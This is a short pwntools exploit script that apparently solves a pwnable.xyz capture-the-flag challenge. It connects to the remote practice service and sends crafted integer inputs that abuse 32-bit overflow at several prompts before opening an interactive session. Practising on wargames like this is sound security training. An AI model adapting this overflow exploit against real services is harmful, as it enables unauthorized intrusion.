from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30008)

#p.sendlineafter('x:','0') # 0
#p.sendlineafter('y:',str(0xffffffff+(0xffffffff-1335))) # 8589933255
p.sendlineafter('x:','1336') 
p.sendlineafter('y:',str(2**32-1))
p.sendlineafter('=== t00leet ===\n','3 ' + str((2**32+1337)/3))
#p.sendlineafter('=== t00leet ===\n','9 ' + str((2**32+1337)/9))
p.sendlineafter('=== 3leet ===\n','0 0 0 0 0')

# 0 8589933255
# 3 1431656211
# 0 0 0 0 0

p.interactive()